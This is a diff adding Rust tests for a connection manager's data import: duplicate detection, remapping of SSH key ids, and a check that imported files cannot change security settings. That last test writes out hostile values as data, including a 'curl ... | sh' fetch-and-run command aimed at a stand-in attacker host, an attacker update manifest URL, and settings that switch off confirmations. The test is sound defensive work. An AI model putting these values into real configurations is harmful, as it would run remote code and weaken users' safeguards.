@@ -301,6 +301,110 @@ fn a_second_import_adds_nothing_and_a_conflict_keeps_both_versions() {
         records[&("host".to_owned(), db_id.to_string())]["notes"],
         "changed after the export"
     );
+
+    // The same file once more: the copy is found by its import key
+    // (`json:<exported id>`, data-model 18.4), no second copy is made.
+    let fourth = import(&target.core, &export.text, None);
+    assert_eq!(fourth.conflicts, 0);
+    assert_eq!(fourth.added, 0);
+    assert_eq!(fourth.existing, 7);
+    let (records, _) = content(&target.core);
+    let copies: Vec<&Value> = records
+        .iter()
+        .filter(|((kind, _), data)| kind == "host" && data["label"] == "db (imported)")
+        .map(|(_, data)| data)
+        .collect();
+    assert_eq!(copies.len(), 1);
+    assert_eq!(copies[0]["import_key"], format!("json:{db_id}"));
+}
+
+#[test]
+fn a_key_found_under_another_id_keeps_the_references_to_it() {
+    let source = populated();
+    let key_id = source.core.keys_list().unwrap()[0].record_id;
+    let keyed = save(
+        &source.core,
+        source.vault_id,
+        None,
+        RecordType::Group,
+        json!({"name": "keyed", "ssh": {"key_id": key_id.to_string()}}),
+        &[],
+    )
+    .expect("group with a key");
+    let export = source.core.data_export(DataExportInput::default()).unwrap();
+    let target = first_run();
+    assert_eq!(import(&target.core, &export.text, None).added, 8);
+
+    // The same key under another id (imported on its own on another
+    // device), named by a group that is new here.
+    let other_key = Uuid::now_v7();
+    let new_group = Uuid::now_v7();
+    let text = export
+        .text
+        .expose_secret()
+        .replace(&key_id.to_string(), &other_key.to_string())
+        .replace(&keyed.record_id().to_string(), &new_group.to_string());
+    let summary = import(&target.core, &SecretString::from(text), None);
+    assert_eq!(summary.added, 1, "only the group is new");
+    assert_eq!(
+        summary.conflicts, 0,
+        "records that name the key are the same once it is the local one"
+    );
+    let (records, _) = content(&target.core);
+    let group = &records[&("group".to_owned(), new_group.to_string())];
+    assert_eq!(group["ssh"]["key_id"], key_id.to_string());
+    assert!(
+        !records.contains_key(&("key".to_owned(), other_key.to_string())),
+        "the key stays local"
+    );
+}
+
+#[test]
+fn settings_that_run_or_open_something_never_come_from_a_file() {
+    let source = populated();
+    let export = source.core.data_export(DataExportInput::default()).unwrap();
+    let mut document: Value = serde_json::from_str(export.text.expose_secret()).unwrap();
+    // A shared "host list" that also carries settings (security.md TB7).
+    let hostile = [
+        (
+            "terminal.os_detection_script",
+            json!("curl -s https://attacker.example/x | sh"),
+        ),
+        ("terminal.os_detection_enabled", json!(false)),
+        ("terminal.local_shell", json!("/opt/attacker/shell")),
+        ("sftp.open_program", json!("attacker-open")),
+        (
+            "updates.manifest_url",
+            json!("https://attacker.example/manifest.json"),
+        ),
+        ("updates.auto_check", json!(true)),
+        ("security.auto_lock_minutes", json!(1440)),
+        ("logs.record_output", json!(true)),
+        ("logs.retention_days", json!(1)),
+        ("terminal.record_history", json!(false)),
+        ("terminal.import_shell_history", json!(true)),
+        ("terminal.confirm_multiline_paste", json!(false)),
+        ("sftp.confirm_delete", json!(false)),
+        ("sftp.name_conflict", json!("replace")),
+    ];
+    for (key, value) in &hostile {
+        document["settings"][*key] = value.clone();
+    }
+    document["settings"]["terminal.font_size"] = json!(18);
+    let target = first_run();
+    let defaults = content(&target.core).1;
+    let summary = import(
+        &target.core,
+        &SecretString::from(document.to_string()),
+        None,
+    );
+    assert_eq!(summary.settings_left_out, hostile.len());
+    let settings = content(&target.core).1;
+    for (key, _) in &hostile {
+        assert_eq!(settings[*key], defaults[*key], "{key} stays as it was");
+    }
+    assert_eq!(settings["terminal.font_size"], 18, "the look comes along");
+    assert_eq!(settings["terminal.copy_on_select"], true);
 }
 
 #[test]
